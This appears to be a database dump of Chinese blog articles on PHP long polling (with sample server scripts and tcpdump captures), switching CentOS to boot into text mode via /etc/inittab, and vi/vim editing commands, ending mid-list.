(118, 1, 'PHP服务端推送技术Long Polling', '', '', '&lt;h3&gt;Long Polling与Polling概述&lt;/h3&gt;\r\n&lt;p&gt;服务端推送技术应用越来越普遍，应用范围也越来越宽广，技术解决方案也越来越成熟且丰富。很多SNS网站的chat功能就有用到了Long Polling技术。比如fackebook, kaixin001。&lt;/p&gt;\r\n&lt;p&gt;Long Polling原理其实很简单，也很讨巧。与Polling相比，Long Polling客户端也许不会马上收到来自服务端的响应，需要等待一些时间(直到有新消息，或者连接timeout了等等)。同样的，客户端也不再需要定时向服务发送请求了，而是直到收到服务端响应之后，或者连接丢失之后，客户端接着马上请求客户端。这里，我打个比方，传统的Polling一般是由C向S询问:”有我的信件吗？”。S接到询问之后，会立即查询，并且把查询结果告诉C，不管有没有C的信件，要码回复:”嗯，你有X封信。”，要码回复:”没，没有你的信”.而Long Polling更像是这样，C向S发出询问:”有我的信件吗？”，S开始查询，如果有则回复C:”嗯，有你x封信”。如果没有，则不作任何回复，而是让C等着，自己一遍一遍地查询是否有订阅者的信。换句话说：当S收到C的查询请求之后，Polling则只查询一次，并且把查询结果告诉C;而Long Polling收到请求之后，则会一遍一遍地查询，直到有消息才会响应C，不然一直hold Client。&lt;/p&gt;\r\n&lt;p&gt;Long Polling相较传统的Polling而言，最大的实惠在于：减少了请求次数。举个例子，假定一个用户每2小时内，有可能收到2条新消息。如果采用传通的Polling方式，每30秒发向服务端发送一次查询请求的话。则在这2小时内，服务器需要处理240(60*60*2/30)次请求，其中至少有238次请求是没有实际意义的。试想，如果是10000的并发量的话，这种浪费是很惊人的。相较而方，Long Polling没有那么浪费服务器资源来处理这些没有实际意义的请求。&lt;/p&gt;\r\n&lt;h3&gt;Polling&lt;/h3&gt;\r\n&lt;p&gt;传统的Polling实现方式比较单一，由客户端javascript脚本定时发送http请求。服务端脚本如下:&lt;/p&gt;\r\n&lt;pre&gt;&lt;div class=&quot;codesnip-container&quot;&gt;&lt;br /&gt;\r\n&lt;pre class=&quot;php codesnip&quot; style=&quot;font-family:monospace;&quot;&gt;&lt;span class=&quot;kw2&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Expires: Sun, 19 Nov 1978 05:00:00 GMT&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Last-Modified: &quot;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;.&lt;/span&gt; &lt;a href=&quot;http://www.php.net/gmdate&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;gmdate&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;D, d M Y H:i:s&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot; GMT&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Cache-Control: store, no-cache, must-revalidate&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Cache-Control: post-check=0, pre-check=0&quot;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw4&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;span class=&quot;re0&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; get_msg&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;kw1&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;re0&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;{&lt;/span&gt;&lt;br /&gt;\r\n &lt;span class=&quot;kw1&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;re0&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;br0&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;kw1&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;{&lt;/span&gt;&lt;br /&gt;\r\n &lt;span class=&quot;kw1&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st_h&quot;&gt;''0''&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;br0&quot;&gt;}&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;sy1&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;p&gt;上面是一个传统polling简单的服务端脚本。很简单，收到客户端请求后，服务端马上执行脚本查询，并且立即响应客户端。客户端等待的时间很短，客户端唯一要做的事情就是定时向服务端发出查询请求。下面是请求时，通过tcpdump抓到的包:&lt;/p&gt;\r\n&lt;pre&gt;1&amp;gt;17:49:03.533760 IP 192.168.0.98.4383 &amp;gt; devhome.http: S 3235664319:3235664319(0) win 65535 &amp;lt;mss 1460,nop,nop,sackOK&amp;gt;&lt;br /&gt;\r\n2&amp;gt;17:49:03.534336 IP devhome.http &amp;gt; 192.168.0.98.4383: S 2018732723:2018732723(0) ack 3235664320 win 5840 &amp;lt;mss 1460,nop,nop,sackOK&amp;gt;&lt;br /&gt;\r\n3&amp;gt;17:49:03.533841 IP 192.168.0.98.4383 &amp;gt; devhome.http: . ack 1 win 65535&lt;br /&gt;\r\n4&amp;gt;17:49:03.534404 IP 192.168.0.98.4383 &amp;gt; devhome.http: P 1:781(780) ack 1 win 65535&lt;br /&gt;\r\n5&amp;gt;&lt;strong&gt;17:49:03.534416 &lt;/strong&gt;IP devhome.http &amp;gt; 192.168.0.98.4383: . ack 781 win 7020&lt;br /&gt;\r\n6&amp;gt;&lt;strong&gt;17:49:03.535033&lt;/strong&gt; IP devhome.http &amp;gt; 192.168.0.98.4383: P 1:369(368) ack 781 win 7020&lt;br /&gt;\r\n7&amp;gt;17:49:03.535110 IP devhome.http &amp;gt; 192.168.0.98.4383: F 369:369(0) ack 781 win 7020&lt;br /&gt;\r\n8&amp;gt;17:49:03.535263 IP 192.168.0.98.4383 &amp;gt; devhome.http: . ack 370 win 65167&lt;br /&gt;\r\n9&amp;gt;17:49:03.536105 IP 192.168.0.98.4383 &amp;gt; devhome.http: F 781:781(0) ack 370 win 65167&lt;br /&gt;\r\n10&amp;gt;17:49:03.536111 IP devhome.http &amp;gt; 192.168.0.98.4383: . ack 782 win 7020&lt;br /&gt;\r\n&lt;/pre&gt;&lt;p&gt;第1、2、3行，TCP三次握手，建立连接。&lt;br /&gt;\r\n第4行，由192.168.0.98向服务端devhome发送httpd请求。&lt;br /&gt;\r\n第5行，由服务端devhome确认收到了来自客户端192.168.0.98的http请求。&lt;br /&gt;\r\n第6行，服务器响devhom响应客户端192.168.0.98刚才发的httpd请求。注意:特别注意一下第一列时间截，http请求与http响应的时间间隔很短，才0.001s&lt;br /&gt;\r\n第7、8、9、10共4行，TCP四次挥手，断开连接。由服务端主动断开连接。&lt;/p&gt;\r\n&lt;h3&gt;Long Polling&lt;/h3&gt;\r\n&lt;p&gt;Long Polling较之Polling稍微有些不一样，Long Polling持续执行，以此延迟对客户端的响应。请查看代码:&lt;/p&gt;\r\n&lt;pre&gt;&lt;div class=&quot;codesnip-container&quot;&gt;&lt;br /&gt;\r\n&lt;pre class=&quot;php codesnip&quot; style=&quot;font-family:monospace;&quot;&gt;&lt;span class=&quot;kw2&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Expires: Sun, 19 Nov 1978 05:00:00 GMT&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Last-Modified: &quot;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;.&lt;/span&gt; &lt;a href=&quot;http://www.php.net/gmdate&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;gmdate&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;D, d M Y H:i:s&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot; GMT&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Cache-Control: store, no-cache, must-revalidate&quot;&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/header&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;header&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st0&quot;&gt;&quot;Cache-Control: post-check=0, pre-check=0&quot;&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kw4&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;co1&quot;&gt;//在$timeout之后，关闭连接，并且要求客户3秒后重新请求&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;kw1&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;re0&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; 0&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;re0&quot;&gt;$timeout&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nu0&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;re0&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;re0&quot;&gt;$timeout&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;re0&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;{&lt;/span&gt;&lt;br /&gt;\r\n &lt;span class=&quot;re0&quot;&gt;$msg&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&lt;/span&gt; get_msg&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span class=&quot;kw1&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;re0&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;br0&quot;&gt;{&lt;/span&gt;&lt;br /&gt;\r\n     &lt;span class=&quot;kw1&quot;&gt;echo&lt;/span&gt; &lt;a href=&quot;http://www.php.net/json_encode&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;json_encode&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;a href=&quot;http://www.php.net/array&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st_h&quot;&gt;''t''&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;st_h&quot;&gt;''info''&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;st_h&quot;&gt;''c''&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;re0&quot;&gt;$msg&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n     &lt;a href=&quot;http://www.php.net/flush&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;flush&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n     &lt;a href=&quot;http://www.php.net/exit&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;exit&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n &lt;span class=&quot;br0&quot;&gt;}&lt;/span&gt; &amp;nbsp;&lt;br /&gt;\r\n &lt;a href=&quot;http://www.php.net/usleep&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;usleep&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;3000000&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;br0&quot;&gt;}&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;kw1&quot;&gt;echo&lt;/span&gt; &lt;a href=&quot;http://www.php.net/json_encode&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;json_encode&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;a href=&quot;http://www.php.net/array&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;array&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;st_h&quot;&gt;''t''&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;st_h&quot;&gt;''refresh''&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;st_h&quot;&gt;''c''&lt;/span&gt; &lt;span class=&quot;sy0&quot;&gt;=&amp;gt;&lt;/span&gt; 3000&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;a href=&quot;http://www.php.net/flush&quot;&gt;&lt;span class=&quot;kw3&quot;&gt;flush&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;br0&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;br0&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;sy0&quot;&gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span class=&quot;sy1&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/pre&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;/pre&gt;&lt;p&gt;上面是Long Polling服务端代码。语意也很明了，如果有$msg，则会马上响应客户端请求，并且关闭该TCP连接。如果在$timeout之内，没有$msg，则会让客户端一直保持该TCP连接，不中断(关闭)。直到超过了$timeout(具体时间主要取决于$timeout * $usleep_time)，服务端会要求客户端重新请求(重新建立TCP连接)，同时关闭当前TCP连接。下面是通过 tcpdump抓到的包:&lt;/p&gt;\r\n&lt;pre&gt;1&amp;gt;18:39:46.449563 IP 192.168.0.98.4407 &amp;gt; devhome.http: S 174149200:174149200(0) win 65535 &amp;lt;mss 1460,nop,nop,sackOK&amp;gt;&lt;br /&gt;\r\n2&amp;gt;18:39:46.449587 IP devhome.http &amp;gt; 192.168.0.98.4407: S 938669730:938669730(0) ack 174149201 win 5840 &amp;lt;mss 1460,nop,nop,sackOK&amp;gt;&lt;br /&gt;\r\n3&amp;gt;18:39:46.449692 IP 192.168.0.98.4407 &amp;gt; devhome.http: . ack 1 win 65535&lt;br /&gt;\r\n4&amp;gt;18:39:46.450308 IP 192.168.0.98.4407 &amp;gt; devhome.http: P 1:793(792) ack 1 win 65535&lt;br /&gt;\r\n5&amp;gt;&lt;strong&gt;18:39:46.450320 &lt;/strong&gt;IP devhome.http &amp;gt; 192.168.0.98.4407: . ack 793 win 7128&lt;br /&gt;\r\n6&amp;gt;&lt;strong&gt;18:42:46.521749&lt;/strong&gt; IP devhome.http &amp;gt; 192.168.0.98.4407: P 1:377(376) ack 793 win 7128&lt;br /&gt;\r\n7&amp;gt;18:42:46.521825 IP devhome.http &amp;gt; 192.168.0.98.4407: P 377:412(35) ack 793 win 7128&lt;br /&gt;\r\n8&amp;gt;18:42:46.521859 IP devhome.http &amp;gt; 192.168.0.98.4407: F 412:412(0) ack 793 win 7128&lt;br /&gt;\r\n9&amp;gt;18:42:46.521997 IP 192.168.0.98.4407 &amp;gt; devhome.http: . ack 412 win 65124&lt;br /&gt;\r\n10&amp;gt;18:42:46.522021 IP 192.168.0.98.4407 &amp;gt; devhome.http: . ack 413 win 65124&lt;br /&gt;\r\n11&amp;gt;18:42:46.522965 IP 192.168.0.98.4407 &amp;gt; devhome.http: F 793:793(0) ack 413 win 65124&lt;br /&gt;\r\n12&amp;gt;18:42:46.522970 IP devhome.http &amp;gt; 192.168.0.98.4407: . ack 794 win 7128&lt;br /&gt;\r\n&lt;/pre&gt;&lt;p&gt;第1、2、3行，TCP三次握手，建立连接。&lt;br /&gt;\r\n第4行，由192.168.0.98向服务端192.168.0.6发送http请求。&lt;br /&gt;\r\n第5行，由192.168.0.6确认收到192.168.0.98刚刚发送的请求。&lt;br /&gt;\r\n第6、7行，服务器host_6响应3分钟前客户端192.168.0.98发出的http请求。注意，第一列的时间截，第5行与第6行之差为3分钟。这与服务端脚本，客户端监控是相呼应的。&lt;br /&gt;\r\n最后4行，TCP四次挥手，断开连接，同样由服务端devhome发起。&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305635084, 1, 'admin'),
(119, 1, 'centOS开机取消图形界面，直接进入文本模式', '', '', '&lt;p&gt;问题来自于像我这样小新手，怕自己搞不明白，在安装centOS的时候要装上图形界面，但是当服务器配置好投入使用后，我们平时管理都是用puTTY连服务器，根本用不到图形界面，开着还占用很大内存，铺张和浪费就是极大的犯罪啊！&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; #vi /etc/inittab&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; --编辑/etc/inittab文件&lt;br /&gt;\r\n找到下面语句：&lt;/p&gt;\r\n&lt;div class=&quot;cnblogs_code&quot;&gt;&lt;div&gt;&lt;span style=&quot;color:#008000;&quot;&gt;#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;Default&amp;nbsp;runlevel.&amp;nbsp;The&amp;nbsp;runlevels&amp;nbsp;used&amp;nbsp;by&amp;nbsp;RHS&amp;nbsp;are:&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;0&amp;nbsp;-&amp;nbsp;halt&amp;nbsp;(Do&amp;nbsp;NOT&amp;nbsp;set&amp;nbsp;initdefault&amp;nbsp;to&amp;nbsp;this)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--停机&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;1&amp;nbsp;-&amp;nbsp;Single&amp;nbsp;user&amp;nbsp;mode&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--单用户模式&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;2&amp;nbsp;-&amp;nbsp;Multiuser,&amp;nbsp;without&amp;nbsp;NFS&amp;nbsp;(The&amp;nbsp;same&amp;nbsp;as&amp;nbsp;3,&amp;nbsp;if&amp;nbsp;you&amp;nbsp;do&amp;nbsp;not&amp;nbsp;havenetworking)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--多用户模式，不支持NFS&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;3&amp;nbsp;-&amp;nbsp;Full&amp;nbsp;multiuser&amp;nbsp;mode&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--多用户模式&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;4&amp;nbsp;-&amp;nbsp;unused&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--没有使用&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;5&amp;nbsp;-&amp;nbsp;X11&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--图形界面方式&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;6&amp;nbsp;-&amp;nbsp;reboot&amp;nbsp;(Do&amp;nbsp;NOT&amp;nbsp;set&amp;nbsp;initdefault&amp;nbsp;to&amp;nbsp;this)&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;--重新启动&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n#&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#008000;&quot;&gt;&lt;br /&gt;\r\n&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;id:&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;5&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;:initdefault:&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;--&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;默认运行等级是5，只要将此处改成&amp;nbsp;id:&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;3&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;:initdefault:即可&lt;br /&gt;\r\n&lt;/span&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在文本模式想启动图形界面，可以打如下命令：&lt;br /&gt;\r\n#startx&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n', 1, 1, 0, 0, 1305713379, 1, 'admin'),
(120, 1, '文本编辑器', '', '', '文本&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/499644.htm&quot;&gt;编辑器&lt;/a&gt;有很多，比如图形模式的gedit、kwrite、OpenOffice，文本模式下的编辑器有vi、vim（vi的增强版本）。vi和vim是我们在Linux中最常用的编辑器。vi或vim是Linux最基本的文本编辑工具，vi或vim虽然没有图形界面编辑器那样点鼠标的简单操作，但vi编辑器在&lt;a target=&quot;_blank&quot; href=&quot;http://baike.baidu.com/view/635537.htm&quot;&gt;系统管理&lt;/a&gt;、服务器管理字符界面中，永远不是图形界面的编辑器能比的。　　&lt;b&gt;vi 的三种命令模式　　&lt;/b&gt;Command（命令）模式，用于输入命令　　Insert（插入）模式，用于插入文本　　Visual（可视）模式，用于视化的的高亮并选定正文　　&lt;b&gt;光标移动　　&lt;/b&gt;　　当我们按ESC进入Command模式后，我们可以用下面的一些键位来移动光标；　　j 向下移动一行　　k 向上移动一行　　h 向左移动一个字符　　l 向右移动一个字符　　ctrl+b 向上移动一屏　　ctrl+f 向下移动一屏　　向上箭头 向上移动　　向下箭头 向下移动　　向左箭头 向左移动　　向右箭头 向右移动　　我们编辑一个文件时，对于 j、k、l和h键，还能在这些动作命令的前面加上数字，比如 3j，表示向下移动3行。　　/# +Enter #为查找的内容　&lt;b&gt;　　插入模式（文本的插入）　　&lt;/b&gt;　　i 在光标之前插入　　a 在光标之后插入　　I 在光标所在行的行首插入　　A 在光标所在行的行末插入　　o 在光标所在的行的下面插入一行　　O 在光标所在的行的上面插入一行　　s 用输入的文本替换光标所在字符　　S 用输入的文本替换光标所在行　&lt;b&gt;　　文本内容的删除操作；　　&lt;/b&gt;　　x 一个字符　　#x 删除几个字符，#表示数字，比如3x　　dw 删除一个单词　　#dw 删除几个单词，#用数字表示，比如3dw表示删除三个单词　　dd 删除一行；　　#dd 删除多个行，#代表数字，比如3dd 表示删除光标行及光标的下两行　　d$ 删除光标到行尾的内容　　J 清除光标所处的行与上一行之间的空格，把光标行和上一行接在一起　　&lt;b&gt;退出保存；&lt;/b&gt;　　